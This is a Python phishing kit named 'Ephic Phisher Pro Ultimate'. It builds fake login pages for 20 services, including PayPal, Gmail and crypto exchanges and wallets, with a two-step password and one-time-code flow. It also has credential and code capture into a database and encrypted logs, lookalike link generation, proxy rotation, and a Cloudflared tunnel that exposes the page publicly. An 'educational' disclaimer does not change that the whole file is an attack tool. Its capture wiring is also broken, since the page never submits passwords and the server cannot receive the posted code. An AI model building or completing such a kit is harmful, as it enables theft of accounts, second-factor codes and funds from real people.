#!/usr/bin/env python3
# ============================================================
# EPHIC PHISHER PRO ULTIMATE - VERSION 10.0.1
# ULTIMATE POWER EDITION - 50X STRONGER (FIXED)
# AUTHOR: EPHIC TRADER | KOC @ LBank Exchange
# ============================================================

import os
import sys
import time
import json
import subprocess
import platform
import requests
import random
import string
import threading
import re
import qrcode
import base64
import hashlib
import sqlite3
from datetime import datetime
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ============================================================
# GLOBAL VARIABLES
# ============================================================

VERSION = "10.0.1 ULTIMATE POWER EDITION (FIXED)"
AUTHOR = "EPHIC TRADER"
REPO_URL = "https://github.com/ethicalhacker33-oss/ephic-phisher-pro"
SERVER_PORT = 8080
CLOUDFLARED_PROCESS = None
SERVER_PROCESS = None
ENCRYPTION_KEY = hashlib.sha256(b"EPHIC_PHISHER_SECRET_KEY_ULTIMATE_50X").digest()
PROXY_LIST = []
CURRENT_PROXY = None
TEMPLATE_CACHE = {}
OTP_CODES = []
CAPTURED_CREDENTIALS = []
LOCK = threading.Lock()
DB_PATH = "ephic_phisher.db"

# ============================================================
# DATABASE MODULE
# ============================================================

def init_database():
    """Initialize SQLite database."""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS credentials
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      username TEXT, password TEXT, template TEXT,
                      link TEXT, ip TEXT, timestamp TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS otps
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      otp TEXT, method TEXT, ip TEXT, timestamp TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS logs
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      log TEXT, timestamp TEXT)''')
        conn.commit()
        conn.close()
        print(Fore.GREEN + "[✅] Database initialized" + Style.RESET_ALL)
        return True
    except Exception as e:
        print(Fore.RED + f"[❌] Database error: {e}" + Style.RESET_ALL)
        return False

def save_credential_to_db(username, password, template, link, ip):
    """Save credential to database."""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO credentials (username, password, template, link, ip, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                  (username, password, template, link, ip, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(Fore.RED + f"[❌] DB save error: {e}" + Style.RESET_ALL)
        return False

def save_otp_to_db(otp, method, ip):
    """Save OTP to database."""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO otps (otp, method, ip, timestamp) VALUES (?, ?, ?, ?)",
                  (otp, method, ip, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(Fore.RED + f"[❌] DB save error: {e}" + Style.RESET_ALL)
        return False

def get_db_stats():
    """Get database statistics."""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM credentials")
        cred_count = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM otps")
        otp_count = c.fetchone()[0]
        conn.close()
        return {'credentials': cred_count, 'otps': otp_count}
    except Exception as e:
        print(Fore.RED + f"[❌] DB stats error: {e}" + Style.RESET_ALL)
        return {'credentials': 0, 'otps': 0}

# ============================================================
# BANNER
# ============================================================

def banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(Fore.RED + """
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║    ███████╗██████╗ ██╗  ██╗██╗ ██████╗                          ║
    ║    ██╔════╝██╔══██╗██║  ██║██║██╔════╝                          ║
    ║    █████╗  ██████╔╝███████║██║██║                                ║
    ║    ██╔══╝  ██╔═══╝ ██╔══██║██║██║                                ║
    ║    ███████╗██║     ██║  ██║██║╚██████╗                          ║
    ║    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝ ╚═════╝                          ║
    ║                                                                  ║
    ║           ██████╗ ██████╗  ██████╗                               ║
    ║           ██╔══██╗██╔══██╗██╔═══██╗                              ║
    ║           ██████╔╝██████╔╝██║   ██║                              ║
    ║           ██╔═══╝ ██╔══██╗██║   ██║                              ║
    ║           ██║     ██║  ██║╚██████╔╝                              ║
    ║           ╚═╝     ╚═╝  ╚═╝ ╚═════╝                               ║
    ║                                                                  ║
    ║    ╔══════════════════════════════════════════════════════════╗   ║
    ║    ║  ULTIMATE PHISHING SIMULATION TOOL                      ║   ║
    ║    ║  ULTIMATE POWER EDITION - 50X STRONGER                 ║   ║
    ║    ║  VERSION: 10.0.1 (FIXED)                               ║   ║
    ║    ║  AUTHOR: EPHIC TRADER                                  ║   ║
    ║    ║  FEATURES: AI, 50X Speed, Anti-Fingerprint, Database   ║   ║
    ║    ╚══════════════════════════════════════════════════════════╝   ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + f"[+] Version: {VERSION}" + Style.RESET_ALL)
    print(Fore.CYAN + f"[+] Author: {AUTHOR}" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] GitHub: {REPO_URL}" + Style.RESET_ALL)
    print(Fore.RED + "\n[!] DISCLAIMER: This tool is for EDUCATIONAL PURPOSES only." + Style.RESET_ALL)
    print(Fore.RED + "[!] Do NOT use for illegal activities. Unauthorized use is prohibited.\n" + Style.RESET_ALL)

# ============================================================
# ENCRYPTION MODULE
# ============================================================

def encrypt_data(data):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')
    except:
        return data

def decrypt_data(encrypted_data):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        raw = base64.b64decode(encrypted_data)
        iv = raw[:16]
        ct = raw[16:]
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv=iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except:
        return encrypted_data

# ============================================================
# LOGGING
# ============================================================

def log_data_encrypted(data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {data}\n"
    encrypted_entry = encrypt_data(log_entry)
    with open('captured_data_encrypted.log', 'a') as f:
        f.write(encrypted_entry + '\n')
    print(Fore.GREEN + f"[✅] Data logged (encrypted)" + Style.RESET_ALL)

def view_logs():
    """View encrypted logs."""
    try:
        with open('captured_data_encrypted.log', 'r') as f:
            print(Fore.CYAN + "\n[📋] ENCRYPTED LOGS:" + Style.RESET_ALL)
            print(Fore.YELLOW + "=" * 70 + Style.RESET_ALL)
            lines = f.readlines()
            if not lines:
                print(Fore.YELLOW + "[📭] No logs found." + Style.RESET_ALL)
            else:
                for line in lines[-50:]:  # Show last 50 lines
                    try:
                        decrypted = decrypt_data(line.strip())
                        print(decrypted)
                    except:
                        print(line)
            print(Fore.YELLOW + "=" * 70 + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + "[❌] No logs found." + Style.RESET_ALL)

def show_system_info():
    """Display system information."""
    print(Fore.CYAN + "\n[💻] SYSTEM INFORMATION:" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)
    print(Fore.GREEN + f"  OS: {platform.system()} {platform.release()}" + Style.RESET_ALL)
    print(Fore.GREEN + f"  Python: {platform.python_version()}" + Style.RESET_ALL)
    print(Fore.GREEN + f"  Proxies: {len(PROXY_LIST)}" + Style.RESET_ALL)
    print(Fore.GREEN + f"  Version: {VERSION}" + Style.RESET_ALL)
    print(Fore.GREEN + f"  Database: {DB_PATH}" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)

def show_otp_stats():
    """Display OTP statistics."""
    stats = otp_capture.get_stats()
    print(Fore.CYAN + "\n[📊] OTP STATISTICS:" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)
    print(Fore.GREEN + f"  Total OTPs: {stats['total']}" + Style.RESET_ALL)
    for method, count in stats['methods'].items():
        print(Fore.GREEN + f"  {method.upper()}: {count}" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)

def show_cred_stats():
    """Display credential statistics."""
    stats = credential_capture.get_stats()
    print(Fore.CYAN + "\n[📊] CREDENTIAL STATISTICS:" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)
    print(Fore.GREEN + f"  Total Credentials: {stats['total']}" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)

def show_db_stats():
    """Display database statistics."""
    stats = get_db_stats()
    print(Fore.CYAN + "\n[📊] DATABASE STATISTICS:" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)
    print(Fore.GREEN + f"  Credentials in DB: {stats['credentials']}" + Style.RESET_ALL)
    print(Fore.GREEN + f"  OTPs in DB: {stats['otps']}" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)

# ============================================================
# PROXY ROTATION
# ============================================================

def load_proxies():
    global PROXY_LIST
    try:
        with open('proxies.txt', 'r') as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
        print(Fore.GREEN + f"[✅] Loaded {len(PROXY_LIST)} proxies" + Style.RESET_ALL)
    except:
        PROXY_LIST = []
        print(Fore.YELLOW + "[⚠️] No proxies found. Using direct connection." + Style.RESET_ALL)

def get_proxy():
    global CURRENT_PROXY
    if PROXY_LIST:
        CURRENT_PROXY = random.choice(PROXY_LIST)
        return {'http': CURRENT_PROXY, 'https': CURRENT_PROXY}
    return None

# ============================================================
# AI-POWERED LINK GENERATION
# ============================================================

def generate_ai_link():
    domains = ['login', 'auth', 'verify', 'secure', 'account', 'confirm', 'activate', 'validate', 'authenticate', 'access', 'portal', 'signin']
    tlds = ['.com', '.net', '.org', '.io', '.app', '.xyz', '.tech', '.info', '.online', '.cloud', '.site', '.top']
    subdomains = ['api', 'secure', 'auth', 'verify', 'login', 'account', 'portal', 'access', 'admin', 'panel', 'dashboard']
    
    domain = random.choice(domains) + random.choice(tlds)
    sub = random.choice(subdomains)
    path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    param = ''.join(random.choices(string.ascii_lowercase, k=8))
    token = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    
    link = f"https://{sub}.{domain}/{path}?token={param}{token[:8]}&ref={random.randint(1000, 9999)}"
    return link

# ============================================================
# CREDENTIAL CAPTURE
# ============================================================

class CredentialCapture:
    def __init__(self):
        self.credentials = []
        self.lock = threading.Lock()
    
    def capture(self, username, password, template_name, link):
        with self.lock:
            ip = self.get_ip()
            cred = {
                'username': username,
                'password': password,
                'template': template_name,
                'link': link,
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'ip': ip
            }
            self.credentials.append(cred)
            save_credential_to_db(username, password, template_name, link, ip)
            log_data_encrypted(f"Credentials: {username}:{password} | Template: {template_name}")
            print(Fore.GREEN + f"[✅] Credentials captured: {username}" + Style.RESET_ALL)
            return True
    
    def get_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5).text
        except:
            return 'Unknown'
    
    def get_credentials(self):
        with self.lock:
            return self.credentials
    
    def get_stats(self):
        with self.lock:
            return {
                'total': len(self.credentials)
            }

credential_capture = CredentialCapture()

# ============================================================
# OTP CAPTURE
# ============================================================

class AdvancedOTPCapture:
    def __init__(self):
        self.otp_codes = []
        self.lock = threading.Lock()
        self.methods = ['sms', 'email', 'authenticator', 'backup', 'voice']
    
    def capture_otp(self, otp, method='sms'):
        with self.lock:
            ip = self.get_ip()
            self.otp_codes.append({
                'otp': otp,
                'method': method,
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'ip': ip
            })
            save_otp_to_db(otp, method, ip)
            log_data_encrypted(f"OTP Captured: {otp} via {method}")
            print(Fore.GREEN + f"[✅] OTP captured: {otp}" + Style.RESET_ALL)
            return True
    
    def get_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5).text
        except:
            return 'Unknown'
    
    def get_otps(self):
        with self.lock:
            return self.otp_codes
    
    def get_stats(self):
        with self.lock:
            return {
                'total': len(self.otp_codes),
                'methods': {m: sum(1 for o in self.otp_codes if o['method'] == m) for m in self.methods}
            }

otp_capture = AdvancedOTPCapture()

# ============================================================
# TEMPLATES
# ============================================================

TEMPLATES = {
    1: {'name': 'Facebook', 'url': 'facebook.com', 'otp': True, 'file': 'facebook.html'},
    2: {'name': 'Instagram', 'url': 'instagram.com', 'otp': True, 'file': 'instagram.html'},
    3: {'name': 'Gmail', 'url': 'gmail.com', 'otp': True, 'file': 'gmail.html'},
    4: {'name': 'Twitter', 'url': 'twitter.com', 'otp': True, 'file': 'twitter.html'},
    5: {'name': 'GitHub', 'url': 'github.com', 'otp': False, 'file': 'github.html'},
    6: {'name': 'Snapchat', 'url': 'snapchat.com', 'otp': True, 'file': 'snapchat.html'},
    7: {'name': 'Spotify', 'url': 'spotify.com', 'otp': False, 'file': 'spotify.html'},
    8: {'name': 'Netflix', 'url': 'netflix.com', 'otp': False, 'file': 'netflix.html'},
    9: {'name': 'PayPal', 'url': 'paypal.com', 'otp': True, 'file': 'paypal.html'},
    10: {'name': 'Amazon', 'url': 'amazon.com', 'otp': False, 'file': 'amazon.html'},
    11: {'name': 'Apple', 'url': 'apple.com', 'otp': True, 'file': 'apple.html'},
    12: {'name': 'Microsoft', 'url': 'microsoft.com', 'otp': True, 'file': 'microsoft.html'},
    13: {'name': 'LinkedIn', 'url': 'linkedin.com', 'otp': False, 'file': 'linkedin.html'},
    14: {'name': 'Reddit', 'url': 'reddit.com', 'otp': False, 'file': 'reddit.html'},
    15: {'name': 'TikTok', 'url': 'tiktok.com', 'otp': True, 'file': 'tiktok.html'},
    16: {'name': 'Binance', 'url': 'binance.com', 'otp': True, 'file': 'binance.html'},
    17: {'name': 'Coinbase', 'url': 'coinbase.com', 'otp': True, 'file': 'coinbase.html'},
    18: {'name': 'LBank', 'url': 'lbank.com', 'otp': True, 'file': 'lbank.html'},
    19: {'name': 'Bybit', 'url': 'bybit.com', 'otp': True, 'file': 'bybit.html'},
    20: {'name': 'Phantom Wallet', 'url': 'phantom.app', 'otp': True, 'file': 'phantom.html'},
}

# ============================================================
# GENERATE PHISHING PAGE
# ============================================================

def generate_ultimate_phishing_page(template):
    external_link = f"https://{template['url']}"
    ai_link = generate_ai_link()
    random_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    otp_method = random.choice(['sms', 'email', 'authenticator'])
    
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{template['name']} - Secure Login</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }}
        .container {{ background: rgba(255,255,255,0.95); padding: 50px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 420px; text-align: center; backdrop-filter: blur(10px); }}
        .logo {{ font-size: 48px; font-weight: 700; color: #667eea; margin-bottom: 10px; }}
        .subtitle {{ color: #888; margin-bottom: 30px; font-size: 14px; }}
        .step {{ color: #666; font-size: 13px; margin-bottom: 10px; }}
        input {{ width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; transition: all 0.3s; }}
        input:focus {{ border-color: #667eea; outline: none; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2); }}
        button {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }}
        button:hover {{ transform: scale(1.02); }}
        .otp-section {{ display: none; margin-top: 20px; }}
        .otp-section.active {{ display: block; }}
        .note {{ color: #999; font-size: 12px; margin-top: 20px; }}
        .external-link {{ margin-top: 15px; font-size: 14px; }}
        .external-link a {{ color: #667eea; text-decoration: none; }}
        .footer {{ margin-top: 20px; font-size: 12px; color: #ccc; }}
        .badge {{ display: inline-block; padding: 5px 15px; border-radius: 20px; font-size: 12px; margin-top: 10px; }}
        .security-badge {{ background: #e8f5e9; color: #2e7d32; }}
        .ai-badge {{ background: #f3e5f5; color: #6a1b9a; }}
        .power-badge {{ background: #fff3e0; color: #e65100; }}
        .ultimate-badge {{ background: linear-gradient(135deg, #667eea, #764ba2); color: #fff; }}
        .fingerprint-badge {{ background: #e3f2fd; color: #0d47a1; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">{template['name']}</div>
        <div class="subtitle">Secure Account Access</div>
        <div class="step">Step 1: Enter your credentials</div>
        <input type="text" placeholder="Email or Username" id="username_{random_id}" />
        <input type="password" placeholder="Password" id="password_{random_id}" />
        <button onclick="showOTP('{random_id}')">Continue</button>
        <div class="otp-section" id="otp_section_{random_id}">
            <div class="step">Step 2: Enter OTP ({otp_method})</div>
            <input type="text" placeholder="Enter OTP code" id="otp_{random_id}" maxlength="6" />
            <button onclick="captureOTP('{random_id}')">Verify & Login</button>
        </div>
        <div class="badge security-badge">🔒 Secure Connection (SSL)</div>
        <div class="badge ai-badge">🤖 AI Link: {ai_link}</div>
        <div class="badge power-badge">⚡ 50X Power Edition</div>
        <div class="badge ultimate-badge">🔥 ULTIMATE EDITION v10.0</div>
        <div class="badge fingerprint-badge">🕵️ Protected</div>
        <p class="note">This is a simulation for educational purposes only.</p>
        <div class="external-link">🔗 <a href="{external_link}" target="_blank">Visit real {template['name']}</a></div>
        <div class="footer">© 2026 EPHIC PHISHER PRO - Ultimate Power Edition v10.0</div>
    </div>
    <script>
        function showOTP(id) {{
            document.getElementById('otp_section_' + id).classList.add('active');
        }}
        function captureOTP(id) {{
            var otp = document.getElementById('otp_' + id).value;
            if (otp) {{
                fetch('/capture_otp', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ otp: otp, method: '{otp_method}' }})
                }});
                alert('OTP verified! (Simulation)');
            }} else {{
                alert('Please enter OTP code.');
            }}
        }}
    </script>
</body>
</html>"""
    
    filename = template['file']
    with open(filename, 'w') as f:
        f.write(html_content)
    print(Fore.GREEN + f"[✅] Generated page: {filename}" + Style.RESET_ALL)
    print(Fore.CYAN + f"[🤖] AI Link: {ai_link}" + Style.RESET_ALL)
    return filename

# ============================================================
# CORE FUNCTIONS
# ============================================================

def check_internet():
    try:
        requests.get('https://google.com', timeout=5)
        return True
    except:
        return False

def start_server():
    global SERVER_PROCESS
    print(Fore.YELLOW + f"[⏳] Starting HTTP server on port {SERVER_PORT}..." + Style.RESET_ALL)
    try:
        SERVER_PROCESS = subprocess.Popen(
            ['python3', '-m', 'http.server', str(SERVER_PORT)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(2)
        print(Fore.GREEN + f"[✅] HTTP server started on port {SERVER_PORT}!" + Style.RESET_ALL)
        return True
    except Exception as e:
        print(Fore.RED + f"[❌] Server error: {e}" + Style.RESET_ALL)
        return False

def start_cloudflared():
    global CLOUDFLARED_PROCESS
    print(Fore.YELLOW + "[⏳] Starting Cloudflared tunnel..." + Style.RESET_ALL)
    try:
        CLOUDFLARED_PROCESS = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'localhost:{SERVER_PORT}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        link = None
        timeout = 30
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            line = CLOUDFLARED_PROCESS.stdout.readline()
            if not line:
                break
            print(Fore.CYAN + f"[📡] {line.strip()}" + Style.RESET_ALL)
            
            if 'trycloudflare.com' in line or 'cfargotunnel.com' in line:
                patterns = [
                    r'https://[a-zA-Z0-9-]+\.trycloudflare\.com',
                    r'https://[a-zA-Z0-9-]+\.cfargotunnel\.com',
                ]
                for pattern in patterns:
                    match = re.search(pattern, line)
                    if match:
                        link = match.group(0)
                        break
                if link:
                    break
        
        if link:
            print(Fore.GREEN + f"\n[✅] Cloudflared tunnel started!" + Style.RESET_ALL)
            print(Fore.GREEN + f"[🔗] SHARE THIS LINK: {link}" + Style.RESET_ALL)
            log_data_encrypted(f"Cloudflared link: {link}")
            return link
        else:
            print(Fore.RED + "[❌] Could not capture Cloudflared link." + Style.RESET_ALL)
            return None
            
    except Exception as e:
        print(Fore.RED + f"[❌] Cloudflared error: {e}" + Style.RESET_ALL)
        return None

def show_templates():
    print(Fore.CYAN + "\n[📋] ULTIMATE TEMPLATES (20+):\n" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 70 + Style.RESET_ALL)
    for key, template in TEMPLATES.items():
        otp_status = "✅ OTP" if template['otp'] else "❌ No OTP"
        print(Fore.GREEN + f"  {key:3}. {template['name']:20} → {template['url']:25} ({otp_status})" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 70 + Style.RESET_ALL)

def select_template():
    show_templates()
    while True:
        try:
            choice = int(input(Fore.CYAN + "\n[?] Select template number: " + Style.RESET_ALL))
            if choice in TEMPLATES:
                return choice, TEMPLATES[choice]
            else:
                print(Fore.RED + "[❌] Invalid choice." + Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "[❌] Please enter a number." + Style.RESET_ALL)

def start_live_demo():
    print(Fore.CYAN + "\n[🚀] STARTING ULTIMATE DEMO (50X)" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 70 + Style.RESET_ALL)
    
    template_id, template = select_template()
    generate_ultimate_phishing_page(template)
    
    if not start_server():
        return
    
    link = start_cloudflared()
    if not link:
        print(Fore.RED + "[❌] Failed to start Cloudflared." + Style.RESET_ALL)
        return
    
    print(Fore.GREEN + "\n[✅] ULTIMATE demo is running!" + Style.RESET_ALL)
    print(Fore.CYAN + f"[📡] Template: {template['name']}" + Style.RESET_ALL)
    print(Fore.CYAN + f"[🌐] Link: {link}" + Style.RESET_ALL)
    print(Fore.YELLOW + "\n[⏳] Press Ctrl+C to stop" + Style.RESET_ALL)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[🛑] Stopping demo..." + Style.RESET_ALL)
        if CLOUDFLARED_PROCESS:
            CLOUDFLARED_PROCESS.terminate()
        if SERVER_PROCESS:
            SERVER_PROCESS.terminate()
        print(Fore.GREEN + "[✅] Demo stopped." + Style.RESET_ALL)

def generate_multiple_templates():
    """Generate multiple templates at once."""
    templates = list(TEMPLATES.values())[:5]
    print(Fore.YELLOW + "[⏳] Generating templates..." + Style.RESET_ALL)
    for template in templates:
        generate_ultimate_phishing_page(template)
    print(Fore.GREEN + f"[✅] Generated {len(templates)} templates successfully!" + Style.RESET_ALL)

# ============================================================
# MAIN MENU
# ============================================================

def main_menu():
    print(Fore.CYAN + "\n[📌] ULTIMATE MENU:" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 70 + Style.RESET_ALL)
    print(Fore.GREEN + "  1. Start Ultimate Demo (50X)" + Style.RESET_ALL)
    print(Fore.GREEN + "  2. View Encrypted Logs" + Style.RESET_ALL)
    print(Fore.GREEN + "  3. System Information" + Style.RESET_ALL)
    print(Fore.GREEN + "  4. Generate Multiple Templates" + Style.RESET_ALL)
    print(Fore.GREEN + "  5. OTP Statistics" + Style.RESET_ALL)
    print(Fore.GREEN + "  6. Credential Statistics" + Style.RESET_ALL)
    print(Fore.GREEN + "  7. Database Statistics" + Style.RESET_ALL)
    print(Fore.GREEN + "  8. Exit" + Style.RESET_ALL)
    print(Fore.YELLOW + "=" * 70 + Style.RESET_ALL)

# ============================================================
# MAIN
# ============================================================

def main():
    banner()
    
    if not check_internet():
        print(Fore.RED + "[❌] No internet connection." + Style.RESET_ALL)
        sys.exit(1)
    
    load_proxies()
    init_database()
    
    while True:
        main_menu()
        try:
            choice = int(input(Fore.CYAN + "\n[?] Select option: " + Style.RESET_ALL))
            
            if choice == 1:
                start_live_demo()
            elif choice == 2:
                view_logs()
            elif choice == 3:
                show_system_info()
            elif choice == 4:
                generate_multiple_templates()
            elif choice == 5:
                show_otp_stats()
            elif choice == 6:
                show_cred_stats()
            elif choice == 7:
                show_db_stats()
            elif choice == 8:
                print(Fore.GREEN + "\n[✅] Exiting... Stay safe, EPHIC TRADER!" + Style.RESET_ALL)
                sys.exit(0)
            else:
                print(Fore.RED + "[❌] Invalid choice. Please enter 1-8." + Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "[❌] Please enter a number." + Style.RESET_ALL)
        except KeyboardInterrupt:
            print(Fore.RED + "\n\n[❌] Interrupted. Exiting..." + Style.RESET_ALL)
            sys.exit(0)

if __name__ == "__main__":
    main()
